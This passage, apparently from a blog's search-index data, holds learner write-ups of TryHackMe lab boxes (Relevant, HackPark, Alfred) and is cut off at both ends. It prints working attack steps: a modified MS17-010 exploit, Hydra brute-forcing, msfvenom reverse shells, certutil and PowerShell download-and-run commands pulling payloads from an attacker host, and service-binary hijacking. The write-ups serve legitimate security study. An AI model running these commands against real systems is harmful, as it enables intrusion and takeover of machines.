Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Relevant | Not valid before: 2023-06-27T17:18:59 |_Not valid after: 2023-12-27T17:18:59 |_ssl-date: 2023-06-28T18:10:32+00:00; +1s from scanner time. | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2023-06-28T18:09:52+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49663/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC MAC Address: 02:CF:CE:A0:45:4F (Unknown) Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s | smb2-time: | date: 2023-06-28T18:09:51 |_ start_date: 2023-06-28T17:19:24 |_nbstat: NetBIOS name: RELEVANT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02cfcea0454f (unknown) | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-28T11:09:52-07:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.54 seconds Port 80 If we access the web page, we will see a default web page that indicates it is for Windows Server Internet Information Services. This tells us that there is a web server running but that is about it. The nmap result shows it is using Microsoft IIS 10.0 (which was considered as the highest version at that moment and still it is), we are not likely to find any vulnerabilities related to this.\nPort 445: SMB Since SMB is open, we will run:\nsmbclient -L \\\\\\\\\u0026lt;IP\u0026gt;\\\\.\nThe result shows:\nsmbclient -L 10.10.240.251 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nt4wrksv Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.240.251 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available I didn\u0026rsquo;t think about checking the sharename \u0026rsquo;nt4wrksv\u0026rsquo;, but the author did check on the share. Let\u0026rsquo;s check that share by running:\nsmbclient \\\\\\\\10.10.240.251\\\\nt4wrksv\nOnce you get in without entering any password, you will be able see a text file password.txt if you run dir command. The content of the password file is\n[User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk It looks like base64-encoded strings. We can either use online tools or use base64 command line tool to decrypt this.\necho \u0026quot;\u0026lt;some_base64-encoded_string\u0026gt; | base64 -d\u0026quot;\nThe result of decrypting the first line is Bob - !P@$$W0rD!123. The second line gives you Bill - Juw4nnaM4n420696969!$$$. What could we do with these credentials? We can try these credentials on evil-winrm.\nevil-winrm -i \u0026lt;ip\u0026gt; -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;\nHowever, the author has put this in to show people that sometimes somethings are too good to be true (meaning these passwords are useless). And he stresses that \u0026lsquo;believe in what you see - if those credentials do not work for anything, that means they are nothing\u0026rsquo;.\nNote: We can also try to use psexec.py. Take a look at this.\nPort 3389 Since port 3389 is open, I ran a nmap scripts that would check for rdp related vulnerabilities.\nnmap --script \u0026quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\u0026quot; -p 3389 -T4 \u0026lt;IP\u0026gt;\nNothing was found. So I think running tools such as crackmapexec wouldn\u0026rsquo;t matter at this point since there is not an account that is interesting to be used.\nPort 49663 Oh well, I don\u0026rsquo;t know how/why I did not think about looking at this port when it apparently shows the second web server - another Microsoft IIS. And it shows that there is a potentially risky HTTP method TRACE. According to OWASP, this can be used as a Cross-Site Tracking (XST) - referencel. So I tried this example command from the article curl -X TRACE \u0026lt;ip\u0026gt;:49663, but it did not give anything back.\nThe author uses dirsearch which I don\u0026rsquo;t think I used before, so I will give it a shot. He uses a command that looks like this:\ndirsearch.py -u \u0026lt;ip\u0026gt; -e -x 400,500 -r -t 100 -w \u0026lt;path_to_wordlist\u0026gt; -u: URL -e: All extensions -x: Exclude ports specified -r: Brute-force recursively (a single level) -t: Number of threads used -w: File path to a word list Warning: Somehow I was not able to run dirsearch on the server. So, instead, I ran gobuster instead.\ngobuster dir -u \u0026lt;ip\u0026gt; -w \u0026lt;path_to_wordlist\u0026gt;\nAfter the run, you will see that there is one match, nt4wrksv directory which we saw from one of the sharenames. So, after finding that out, if I go to \u0026lt;ip\u0026gt;/nt4wrksv, it shows a blank page in black.\nVulnerability Check Maybe, once we find out the open ports from the Nmap scans, I should try to run this command to see if there are any known vulnerabilities:\nnmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 \u0026lt;ip\u0026gt;\nAlthough I have run vulnerability searches related to SMB and RDP, but this will do the whole vulnerabilities that it can find.\nnmap -Pn --script vuln -p 80,135,139,445,3389 10.10.245.179 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 20:15 UTC Nmap scan report for ip-10-10-245-179.eu-west-1.compute.internal (10.10.245.179) Host is up (0.0066s latency). PORT STATE SERVICE 80/tcp open http |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. |_http-csrf: Couldn\u0026#39;t find any CSRF vulnerabilities. 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server MAC Address: 02:CF:DF:34:15:2B (Unknown) Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 200.99 seconds The result shows that there can be ms17-010 which indicates EternalBlue vulnerability. I knew this! I should have known this when I saw that SMBv1 was listed (although I was trying to make the exploit work but could not).\nMS17-010 There are two ways Follow the author\u0026rsquo;s instruction Somehow make the AutoBlue script work by fixing the indentation problem\u0026hellip; The author\u0026rsquo;s way What the author does to see if the server is exploitable is by checking to see if the server somehow uses the same directory as the SMB share!\nSo, if we were to test accessing\u0026lt;ip\u0026gt;/nt4wrksv/passwords.txt, we will see the contents of passwords.txt. So, knowing this, using smbclient, we can upload a reverse shell onto the system simply (he did choose to use a .aspx extension as Windows IIS servers use many of those file extensions). After that, he checks what kind of privilege the user account has and do further exploitations there to escalate the privilege - writeup.\nUsing original 42315.py Indentation correction in python - https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/\nThis was something that I had to resolve when using VM\u0026rsquo;s default vim where, after modifying code, it would complain about wrong indentations.\nOriginal MS17-010 python script from exploit-db.com Referred to: https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd\nhttps://www.exploit-db.com/exploits/42315\nThis was written for python2 versions so I had to use Python2.7 If pip2.7 isot installed, you can do: wget https://bootstrap.pypa.io/pipi/2.7/get-pip.py if doesn\u0026rsquo;t work, run curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py instead run the get-pip.py with python2.7 once pip2.7 is installed, you will need the impacket module: pip2.7 install --update setuptools pip2.7 install impacket If there are username, password that you can use, modify the script to enter them\nTo launch a reverse shell (have a reverse shell ready), changing some code is required\nusing smb_send_file() and service_exec() instead of the five lines above them def smb_pwn(conn, arch): smbConn = conn.get_smbconnection() #print(\u0026#39;creating file c:\\\\pwned.txt on the target\u0026#39;) #tid2 = smbConn.connectTree(\u0026#39;C$\u0026#39;) #fid2 = smbConn.createFile(tid2, \u0026#39;/pwned.txt\u0026#39;) #smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2) smb_send_file(smbConn, \u0026#39;rev.exe\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;/rev.exe\u0026#39;) service_exec(conn, r\u0026#39;c:\\rev.exe\u0026#39;) # Note: there are many methods to get shell over SMB admin session # a simple method to get shell (but easily to be detected by AV) is # executing binary generated by \u0026#34;msfvenom -f exe-service ...\u0026#34; Python 3 working version of MS17-010 scripts: https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master Didn\u0026rsquo;t get to work this script out Overall, this challenge allowed me to learn how to use/modify the resources that I can find online and adjust the way they are used for my own cases. Another interesting challenge!\n","permalink":"https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/","summary":"\u003ch2 id=\"challenge-relevant\"\u003eChallenge: Relevant\u003c/h2\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003ch3 id=\"nmap\"\u003eNMAP\u003c/h3\u003e\n\u003cp\u003eI was not able to find any clues from the initial Nmap scans and other tools\nthat I used. So I looked up the official writeup, and the author suggests to run\na scan that detects the open ports and then run more focused Nmap scan on them.\nHe created a tool \u003ccode\u003ethreader3000\u003c/code\u003e and I decided to give it a try.\u003c/p\u003e\n\u003cp\u003eThe result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and\n49668. And these 40,000s are commonly used for backend operations within virtual\nenvironments such as AWS.\u003c/p\u003e","title":"TryHackMe - Relevant"},{"content":"Challenge: HackPark In this box, it introduces Hydra, RCE \u0026amp; WinPEAS tools/techniques to exploit a Windows System.\nRecon NMAP nmap -sC -sV -O -sT 10.10.170.188 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188) Host is up (0.00068s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=hackpark | Not valid before: 2023-06-19T18:14:25 |_Not valid after: 2023-12-19T18:14:25 | rdp-ntlm-info: | Target_Name: HACKPARK | NetBIOS_Domain_Name: HACKPARK | NetBIOS_Computer_Name: HACKPARK | DNS_Domain_Name: hackpark | DNS_Computer_Name: hackpark | Product_Version: 6.3.9600 |_ System_Time: 2023-06-20T18:28:24+00:00 MAC Address: 02:51:BA:0B:1C:1B (Unknown) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (89%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once we get the cred to get onto the target machine we can remotely access it by using xfreerdp or rdesktop.\nAttacking the login page The official write-up takes me to the login page of the website. After finding a login page, we need to identify what type of requests the form makes to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.\nWe can check which request is made when a form is submitted by inspecting HTML elements. Once we know the URL for the login form and the type of request being made, we can start the brute-force attack on an account.\nWhen I clicked on the login page link, the URL changed to http://10.10.170.188/Account/login.aspx?ReturnURL=/admin/. Because of this, I would try the brute-force attack on the admin account first. To do this, we can use hydra which is a login cracker.\nhydra -l \u0026lt;username\u0026gt; -P \u0026lt;path_to_wordlist\u0026gt; \u0026lt;ip\u0026gt; http-post-form\nSo first, I tried hydra -l admin -P \u0026lt;path_to_wordlist\u0026gt; 10.10.170.188 http-post-form, but it was not working. I had to look up what I was doing wrong, then I found out from this article that, in order to to an attack on a login form, we need to know the following parameters: Hostname/IP, Login Page URL, Request Body, and Error Message.\nhydra -L \u0026lt;USER\u0026gt; -P \u0026lt;Password\u0026gt; \u0026lt;ip\u0026gt; http-post-form “\u0026lt;Login Page\u0026gt;:\u0026lt;Request Body\u0026gt;:\u0026lt;Error Message\u0026gt;”\nThis is the “\u0026lt;Login Page\u0026gt;:\u0026lt;Request Body\u0026gt;:\u0026lt;Error Message\u0026gt;” part I crafted. Make sure that contents are separated using :.\n\u0026#34;/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO\u0026amp;__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx\u0026amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\u0026#34; The \u0026lsquo;VIEWSTATE\u0026rsquo; part is from the request payload you can see from the inspector of your web-browser.\nThe command I used:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.188 http-post-form \u0026#34;/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO\u0026amp;__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx\u0026amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\u0026#34; I was able to get admin:1qaz2wsx\nCompromise the machine Since we have a credential to use, we will use exploit-db.com to get initial access on the target machine. #Exploit-db is a #CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches (owned by Offensive Security).\nSo, if we login using the admin credential, we can see that the service is blogengine.net with version 3.3.6.0. Let\u0026rsquo;s search for some exploits using searchsploit.\nThis exploit is simple enough to follow. The instruction tells me how to upload a file to the existing post - download the .cs file provided and modify it so it includes our machine (or the attacker\u0026rsquo;s machine IP address and the port) and rename it to PostView.ascx. Then finally go to the address http://\u0026lt;IP\u0026gt;/?theme=../../App_Data/files. If everything is done properly, your nc listener should have the connection.\nWindows Privilege Escalation Although we have a shell, the shell behaves abnormally. So, we would need to upload a shell generated by msfvenom then use that shell to have a stable connection.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.223 LPORT=2345 -f exe -o rev.exe will get us the reverse shell. And we will move this onto the victim machine by running certutil.exe -urlcache -split -f \u0026quot;http://10.13.14.223:8000/rev.exe\u0026quot; %tmp%\\rev.exe. This will put the file onto C:\\Windows\\Temp directory.\nRunning rev.exe will give us a better shell on nc listener 2345.\nThe next question asks what is the name of the abnormal service running. In order to find out about this, moving WinPEAS onto the target machine then have it enumerate the machine.\nAfter running WinPEAS, I looked through the services running on the system and this one system caught my eye:\nWindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\\PROGRA~2\\SYSTEM~1\\WService.exe] - Auto - Running File Permissions: Everyone [WriteData/CreateFiles] Possible DLL Hijacking in binary folder: C:\\Program Files (x86)\\SystemScheduler (Everyone [WriteData/CreateFiles]) WindowsScheduler file permission is Everyone and it says Possible DLL Hijacking in binary folder.\nLet\u0026rsquo;s move into the directory then. In the binary folder, you can see a few .dll files. However, the module\u0026rsquo;s question asks what the name of the binary we are supposed to exploit. So I would assume that would be scheduler.exe or wscheduler.exe, but they were not. The hint suggest to look at the log of this abnormal service. I moved into Events directory and I found out this file \u0026lt;whatever the number was\u0026gt;.INI_LOG.txt.\nThe parts of the log shows:\n06/20/23 20:30:33,Process Ended. PID:1848,ExitCode:4,Message.exe (Administrator) 06/20/23 20:31:01,Event Started Ok, (Administrator) 06/20/23 20:31:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator) 06/20/23 20:32:01,Event Started Ok, (Administrator) 06/20/23 20:32:33,Process Ended. PID:2376,ExitCode:4,Message.exe (Administrator) 06/20/23 20:33:01,Event Started Ok, (Administrator) 06/20/23 20:33:33,Process Ended. PID:1636,ExitCode:4,Message.exe (Administrator) It runs Message.exe! This suggests that if we can overwrite this file with our own executable (with the same name), we can run that executable as the Administrator privilege.\nI crafted a new reverse shell with a different port number and moved that shell into the directory (also changed the name of the shell to Message.exe). A few moments later, I was able to see this:\n└─$ nc -lnvp 5678 listening on [any] 5678 ... connect to [10.13.14.223] from (UNKNOWN) [10.10.123.161] 49339 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\PROGRA~2\\SYSTEM~1\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 0E97-C552 Directory of C:\\PROGRA~2\\SYSTEM~1 With this new connection with escalated privilege, I was able to get the user flag and the root flag.\nAnother interesting Windows box with using different tools to exploit a system.\n","permalink":"https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/","summary":"\u003ch2 id=\"challenge-hackpark\"\u003eChallenge: HackPark\u003c/h2\u003e\n\u003cp\u003eIn this box, it introduces Hydra, RCE \u0026amp; WinPEAS tools/techniques to exploit a\nWindows System.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003ch3 id=\"nmap\"\u003eNMAP\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -sC -sV -O -sT 10.10.170.188\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC\nNmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188)\nHost is up (0.00068s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT     STATE SERVICE            VERSION\n80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| http-robots.txt: 6 disallowed entries\n| /Account/*.* /search /search.aspx /error404.aspx\n|_/archive /archive.aspx\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: hackpark | hackpark amusements\n| http-methods:\n|_  Potentially risky methods: TRACE\n3389/tcp open  ssl/ms-wbt-server?\n|_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=hackpark\n| Not valid before: 2023-06-19T18:14:25\n|_Not valid after:  2023-12-19T18:14:25\n| rdp-ntlm-info:\n|   Target_Name: HACKPARK\n|   NetBIOS_Domain_Name: HACKPARK\n|   NetBIOS_Computer_Name: HACKPARK\n|   DNS_Domain_Name: hackpark\n|   DNS_Computer_Name: hackpark\n|   Product_Version: 6.3.9600\n|_  System_Time: 2023-06-20T18:28:24+00:00\nMAC Address: 02:51:BA:0B:1C:1B (Unknown)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2\nAggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 79.85 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePort 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once\nwe get the cred to get onto the target machine we can remotely access it by\nusing \u003ccode\u003exfreerdp\u003c/code\u003e or \u003ccode\u003erdesktop\u003c/code\u003e.\u003c/p\u003e","title":"TryHackMe - HackPark"},{"content":"Challenge: Alfred This box is about exploiting Jenkins (misconfiguration). Jenkins is an open source continuous integration/continuous delivery and deployment (CI/CD) automation software DevOps tool written in the Java programming language. This tool is used to implement CI/CD workflows, called pipelines.\nThis box introduces a tool called Nishang which is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.\nRecon nmap -sC -sV -O 10.10.141.130 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 13:26 UTC Nmap scan report for ip-10-10-141-130.eu-west-1.compute.internal (10.10.141.130) Host is up (0.00064s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open tcpwrapped | ssl-cert: Subject: commonName=alfred | Not valid before: 2023-06-19T13:17:42 |_Not valid after: 2023-12-19T13:17:42 |_ssl-date: 2023-06-20T13:27:05+00:00; 0s from scanner time. 8080/tcp open http Jetty 9.4.z-SNAPSHOT |_http-server-header: Jetty(9.4.z-SNAPSHOT) |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). | http-robots.txt: 1 disallowed entry |_/ MAC Address: 02:17:C8:59:D2:7D (Unknown) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.10 seconds Although I did not do the full ports scan, this single scan result was enough to answer the questions. It has a http site, port 3389 for RDP, and port 8080 for Jetty 9.4.z-SNAPSHOT (Jenkins). Also, it runs a Windows Server 2008. There is an email address \u0026ldquo;alfred@wayneenterprises.com\u0026rdquo;.\nPinging this 10.10.141.130 won\u0026rsquo;t work since this is a Windows server. A write up that I am referring to uses this nmap command (the -Pn flag is used to get around the fact that the ping command would not work):\nnmap -sT -A -v [boot2root ip] -Pn -p- -O -sC -oX tcp_scan.xml\nSince port 3389 is open, I would try to run nmap scripts for RDP.\nnmap --script \u0026#34;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\u0026#34; -p 3389 -T4 10.10.141.130 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 13:34 UTC Nmap scan report for ip-10-10-141-130.eu-west-1.compute.internal (10.10.141.130) Host is up (0.00021s latency). PORT STATE SERVICE 3389/tcp open ms-wbt-server | rdp-vuln-ms12-020: | VULNERABLE: | MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability | State: VULNERABLE | IDs: CVE:CVE-2012-0152 | Risk factor: Medium CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P) | Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service. | | Disclosure date: 2012-03-13 | References: | http://technet.microsoft.com/en-us/security/bulletin/ms12-020 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152 | | MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability | State: VULNERABLE | IDs: CVE:CVE-2012-0002 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system. | | Disclosure date: 2012-03-13 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002 |_ http://technet.microsoft.com/en-us/security/bulletin/ms12-020 |_rdp-enum-encryption: Received unhandled packet MAC Address: 02:17:C8:59:D2:7D (Unknown) Nmap done: 1 IP address (1 host up) scanned in 90.44 seconds MS12-020 looks interesting as it is a RCE vulnerability.\nHowever, before doing anything, one of the questions from the module asks the username and password for the login panel. Since I don\u0026rsquo;t know how to get to the login page, I can use #dirbuster (or #gobuster) to see what directory paths there exist. I will use gobuster since I always struggle to use dirbuster.\ngobuster dir -u \u0026lt;target_url\u0026gt; -w \u0026lt;path_to_wordlists\u0026gt; do not forget to specify port if needed I was not able to find anything so I tried dirbuster as well. However, nothing interesting was found either here.\nOne thing I should have realized earlier was to access the Jenkins server page (port 8080) too. If you go to \u0026lt;IP\u0026gt;:8080, you will be able to see the welcome page of Jenkins. Then I searched for default credentials the Jenkins server would have. First, I tried admin:password, then admin:admin. \u0026ldquo;admin:admin\u0026rdquo; got me into the server dashboard.\nThe hint suggest that I should look into the configuration tab under \u0026lsquo;project\u0026rsquo; at the bottom of the index page.\nAfter inspecting the current project, under \u0026ldquo;Build\u0026rdquo; section, you can enter Windows shell command so it can be executed! If we write our custom shell command so that we can start a reverse shell, we will be able to access the server machine. So, we will create a reverse shell using msfvenom and upload it onto the target machine.\nmsfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=\u0026lt;IP\u0026gt; LPORT=\u0026lt;port\u0026gt;\nOpps! As the module stated, we will use nishang\u0026rsquo;s reverse shell here. Invoke-PowerShellTcp.ps1 And we will put the powershell command that uploads the reverse shell onto the system. The command is already given from the module:\npowershell iex(New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;IP\u0026gt;:\u0026lt;port\u0026gt;/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress \u0026lt;attacker\u0026#39;s IP\u0026gt; -Port \u0026lt;attacker\u0026#39;s Port\u0026gt; this should be followed by opening a listener using nc the address in the downloadstring portion must be your python server attacker\u0026rsquo;s port must match \u0026rsquo;nc\u0026rsquo; listener\u0026rsquo;s port number Once you put that command into the build section, come back to the main page and click the greenish icon to start the build process. After that, you will be able to see the reverse shell connection is established (if not, check the typos in the command you entered or not setting listeners up properly).\nThere is another way you can establish a connection using nc. Instead of uploading a shell, we can upload nc then manually call a reverse shell (what I mean by manually is without any help of created shell files).\nFirst build command we can enter is certutil.exe -urlcache -split -f \u0026quot;http://\u0026lt;IP\u0026gt;:\u0026lt;Port\u0026gt;/nc.exe\u0026quot; %tmp%\\nc.exe. This command will put the nc program into the temp directory. cerutil is a command-line program that can actually run some of other commands.\nAlso, you could have used the reverse shell created using msfvenom.\nThen you can run %tmp%\\nc.exe \u0026lt;attacker's 